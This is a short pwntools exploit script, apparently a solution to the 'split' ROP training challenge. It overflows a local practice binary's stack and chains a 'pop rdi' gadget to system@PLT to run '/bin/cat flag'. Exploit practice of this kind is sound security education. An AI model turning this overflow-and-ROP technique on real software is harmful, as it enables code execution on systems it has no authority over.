#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def exploit():

    system_PLT   = 0x4005e0    # objdump -d -j .plt ./split | grep system
    bin_cat_flag = 0x601060    # gdb: find '/bin/cat'

    payload =  40 * "A"          # offset to overwrite rip
    payload += p64(0x400883)     # pop rdi; ret
    payload += p64(bin_cat_flag) # cat flag string
    payload += p64(system_PLT)   # system@PLT

    p = process('./split')
    p.sendlineafter('> ', payload)
    print p.recvall()

if __name__ == '__main__':
    exploit()
#_EOF